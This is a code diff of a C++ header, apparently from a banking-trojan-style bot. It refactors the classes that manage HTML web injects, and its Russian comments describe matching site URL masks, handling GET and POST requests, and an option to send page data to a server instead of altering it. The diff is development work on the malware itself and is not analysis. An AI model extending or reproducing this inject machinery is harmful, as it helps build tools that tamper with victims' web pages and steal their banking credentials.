@@ -43,46 +43,40 @@ class THTMLInjectData;
 //---------------------------------------------
 //  THTMLInjectList - Список HTML инжектов
 //---------------------------------------------
-class THTMLInjectList :  public TEventContainer
+class THTMLInjectList : public TBotCollection, public TEventContainer
 {
 private:
-	PList FInjects;
-	RTL_CRITICAL_SECTION FLock;
-
 	friend class THTMLInject;
 	friend class TBotConfig;
 protected:
-	void Lock();
-	void Unlock();
 	bool GetInjectsForURL(THTTPMethod Method, const char *URL, PList List);
 public:
+	TValues* Variables;
+
 	THTMLInjectList();
 	~THTMLInjectList();
 
-
+    void Clear();
 	THTMLInject* AddInject();
 	void ResetInjectsStatus();
-	void Clear();
+
 	bool LoadFromMem(LPVOID Buf, DWORD BufSize);
 	void ReleaseInjects(PList Injects);
 	bool GetInjectsForRequest(PRequest Request);
     bool IsInjectURL(const char* URL, THTTPMethod Method = hmUnknown);
 
-	inline DWORD Count() const { return List::Count(FInjects); };
-	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
-	inline THTMLInject* operator[](int Index) const { return Items(Index);};
+	inline THTMLInject* Items(int Index) const { return (THTMLInject*)((TBotCollection*)this)->Items(Index); }
 };
 
 
 //---------------------------------------------
 //  THTMLInject - HTML инжект
 //---------------------------------------------
-class THTMLInject : public TEventContainer
+class THTMLInject : public TBotCollectionItem, public TEventContainer
 {
 private:
-    THTMLInjectList *FOwner;
-	PList  FInjects;   // Список инжектов (список элементов типа PHTMLInject)
-	LONG   FRefCount;  // Количество текущих блокировок инжекта
+	TBotCollection* FItems;     // Список инжектов (список элементов типа PHTMLInject)
+	LONG            FRefCount;  // Количество текущих блокировок инжекта
 
 	void AddRef();
 	void Release();
@@ -90,24 +84,23 @@ private:
 	friend class THTMLInjectList;
 	friend class THTMLInjectData;
 public:
-	string URL;       // Маска сайта для которого необходимо обрабатывать страницы
-	bool   GET; 		 // Обрабатывать GET запросы
+	string URL;        // Маска сайта для которого необходимо обрабатывать страницы
+	bool   GET; 	   // Обрабатывать GET запросы
 	bool   POST;       // Обрабатывать POST запросы
 	bool   IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
 	bool   Disabled;   // Не использовать инжект (Для отладочной программы)
-	bool   Used;       // Признак того что маска использовалась
-	bool   DestroyAfterRelease; // Уничтожить инжект после обнуления счётчика
+	bool   Activated;  // Признак того что маска использовалась
 	DWORD  ID;         // Ижентификатор, Для внутренних нужд
-	string Comment;   // Коментарий к инжекту, только для редактора
+	string Comment;    // Коментарий к инжекту, только для редактора
 
 	THTMLInject(THTMLInjectList *aOwner);
 	~THTMLInject();
 
-	THTMLInjectData* AddData();
-	void Clear();
-	inline int Count() {return List::Count(FInjects);}
-	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)List::GetItem(FInjects, Index);}
-	inline THTMLInjectData* operator[](int Index) const { return Items(Index); };
+	THTMLInjectData*        AddData();
+	inline void             Clear() { FItems->Clear(); }
+	inline int              Count() {return FItems->Count(); }
+    int                     ContainVariable(const char* VarName);
+	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)FItems->Items(Index); }
 };
 
 
@@ -118,7 +111,7 @@ enum TInjectDataState {idsUnknown, idsOk, idsError};
 //---------------------------------------------
 //  THTMLInjectData - данные HTML инжекта
 //---------------------------------------------
-class THTMLInjectData : public TEventContainer
+class THTMLInjectData : public TBotCollectionItem, public TEventContainer
 {
 private:
 	THTMLInject* FOwner;
@@ -134,7 +127,6 @@ public:
 	bool Disabled;     // Не использовать инжект (Для отладочной программы)
 
 	THTMLInjectData(THTMLInject *aOwner);
-	~THTMLInjectData();
 
 	inline THTMLInject* Owner() {return FOwner;}
 	void Copy(const THTMLInjectData &Data);
